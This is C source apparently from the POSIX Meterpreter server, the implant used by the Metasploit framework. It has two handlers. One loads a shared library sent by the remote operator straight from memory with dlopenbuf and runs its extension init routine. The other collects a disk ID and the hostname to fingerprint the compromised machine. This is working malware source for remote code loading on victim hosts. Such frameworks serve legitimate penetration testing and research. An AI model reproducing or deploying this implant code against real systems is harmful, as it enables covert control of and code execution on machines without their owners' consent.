#include <dlfcn.h>
#include "metsrv.h"
#include <sys/types.h>
#include <dirent.h>
#include <sys/utsname.h>
#define MAX_PATH 256

extern Command *extensionCommands;
extern PLIST gExtensionList;

DWORD request_core_loadlib(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	HMODULE library;
	PCHAR libraryPath;
	DWORD flags = 0;
	PCHAR targetPath;
	int local_error = 0;
	Command *command;
	Command *first = extensionCommands;

	do
	{
		Tlv dataTlv;

		libraryPath = packet_get_tlv_value_string(packet, TLV_TYPE_LIBRARY_PATH);
		flags = packet_get_tlv_value_uint(packet, TLV_TYPE_FLAGS);

		// Invalid library path?
		if (!libraryPath)
		{
			res = ERROR_INVALID_PARAMETER;
			break;
		}

		if (flags & LOAD_LIBRARY_FLAG_LOCAL)
		{
			// i'd be surprised if we could load 
			// libraries off the remote system without breaking severely.
			res = ERROR_NOT_SUPPORTED;
			break;
		}

		// Get the library's file contents
		if ((packet_get_tlv(packet, TLV_TYPE_DATA,
			&dataTlv) != ERROR_SUCCESS) ||
			(!(targetPath = packet_get_tlv_value_string(packet,
			TLV_TYPE_TARGET_PATH))))
		{
			res = ERROR_INVALID_PARAMETER;
			break;
		}

		dprintf("targetPath: %s", targetPath);

		library = dlopenbuf(targetPath, dataTlv.buffer, dataTlv.header.length);
		dprintf("dlopenbuf(%s): %08x / %s", targetPath, library, dlerror());
		if (!library)
		{
			res = ERROR_NOT_FOUND;
			break;
		}

		// If this library is supposed to be an extension library, try to
		// call its Init routine
		if (flags & LOAD_LIBRARY_FLAG_EXTENSION)
		{
			PEXTENSION pExtension = (PEXTENSION)malloc(sizeof(EXTENSION));
			if (!pExtension)
			{
				res = ERROR_NOT_ENOUGH_MEMORY;
				break;
			}
			//DWORD(*init)(Remote *remote);

			pExtension->init = dlsym(library, "InitServerExtension");

			// Call the init routine in the library
			if (pExtension->init)
			{
				dprintf("calling InitServerExtension");
				pExtension->end = first;
				res = pExtension->init(remote);
				pExtension->start = extensionCommands;
				pExtension->getname = dlsym(library, "GetExtensionName");
				pExtension->deinit = dlsym(library, "DeinitServerExtension");

				if (pExtension->getname)
				{
					pExtension->getname(pExtension->name, sizeof(pExtension->name));
				}
				list_push(gExtensionList, pExtension);
			}
			else
			{
				free(pExtension);
			}

			if (response)
			{
				for (command = pExtension->start; command != pExtension->end; command = command->next)
				{
					packet_add_tlv_string(response, TLV_TYPE_METHOD, command->method);
				}
			}
		}

	} while (0);

	if (response)
	{
		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
		PACKET_TRANSMIT(remote, response, NULL);
	}

	return (res);
}

DWORD request_core_machine_id(Remote* pRemote, Packet* pPacket)
{
	DWORD res = ERROR_SUCCESS;
	Packet* pResponse = packet_create_response(pPacket);

	if (pResponse) {
		char buffer[MAX_PATH];
		struct dirent *data;
		struct utsname utsbuf;
		DIR *ctx = opendir("/dev/disk/by-id/");

		if (uname(&utsbuf) == -1) {
			res = GetLastError();
			goto out;
		}

		if (ctx == NULL) {
			res = GetLastError();
			goto out;
		}

		while (data = readdir(ctx)) {
			// TODO: make sure that looking for drives prefixed with "ata" is a good
			// idea. We might need to search for a bunch of prefixes.
			if (strncmp(data->d_name, "ata-", 4) == 0) {
				snprintf(buffer, MAX_PATH - 1, "%s:%s", data->d_name + 4, utsbuf.nodename);
				packet_add_tlv_string(pResponse, TLV_TYPE_MACHINE_ID, buffer);
				break;
			}
		}
		closedir(ctx);

	out:

		packet_transmit_response(res, pRemote, pResponse);
	}

	return ERROR_SUCCESS;
}
